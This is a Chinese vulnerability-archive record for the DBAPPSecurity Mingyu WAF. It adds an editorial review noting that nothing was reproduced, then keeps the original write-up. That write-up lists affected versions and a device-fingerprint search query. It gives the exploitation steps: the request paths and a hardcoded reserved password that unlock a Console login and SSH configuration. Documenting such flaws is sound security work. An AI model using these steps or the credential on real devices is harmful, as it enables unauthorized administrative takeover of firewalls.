---
source: "wy876 漏洞文库"
id: "vw-205d4787e617fd02be2f71b6"
entity_id: "ve-205d4787e617fd02be2f71b6"
schema_version: "1"
title: "安恒明御 WAF 固定 Console 身份访问线索"
product: "安恒明御WAF"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "X86≤4.6.33、兆芯4.5、鲲鹏4.6.18声称；后续保留页需固定密码"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1Web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1Web%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fg8ocgvc7bpywni4"
source_status: "recorded"
previous_fofa_unverified: "app.name="
hunter: "app.name=\"安恒明御 WEB应用防火墙\""
---

# 安恒明御 WAF 固定 Console 身份访问线索

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：安恒明御WAF
- 本文讨论：report.m rpc-timed Console登录/保留系统管理功能
- 版本、权限与配置前提：X86≤4.6.33、兆芯4.5、鲲鹏4.6.18声称；后续保留页需固定密码
- 资料类型：Console硬编码登录及管理链；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 任意登录应准确为固定Console身份，不能任意用户身份
- 跳转页面提示缺图/响应，修改SSH条件需和初始登录分开
- 未给修复/厂商原源，FOFA元数据误装Hunter
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- report.php与report.m路由关系、硬编码账户/密码及版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
<font style="color:rgb(36, 41, 46);">安恒 明御WEB应用防火墙 report.php文件存在硬编码设置的Console用户登录</font>

# <font style="color:rgb(36, 41, 46);">二、影响版本</font>
+ <font style="color:rgb(36, 41, 46);">明御 WAF X86 架构 <= 4.6.33</font>
+ <font style="color:rgb(36, 41, 46);">明御 WAF 信创兆芯 = 4.5</font>
+ <font style="color:rgb(36, 41, 46);">明御 WAF 鲲鹏 = 4.6.18</font>

# <font style="color:rgb(36, 41, 46);">三、资产测绘</font>
+ hunter：`app.name="安恒明御 WEB应用防火墙"`


+ 登录页面


# 四、漏洞复现
1. 访问poc

```plain
/report.m?a=rpc-timed
```


2. <font style="color:rgb(36, 41, 46);">接着删除路径信息，再次访问登录界面就会出现这个界面</font>


3. 访问下面这个路径，进入系统设置（不能直接点系统设置），就可以更改SSH的配置了。

```plain
/system.m?a=reserved
```


4. 在密码框中，输入密码,就可以更改SSH配置,也可查看其他菜单

```plain
!@#dbapp-waf-dev-reserved#@!
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fg8ocgvc7bpywni4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
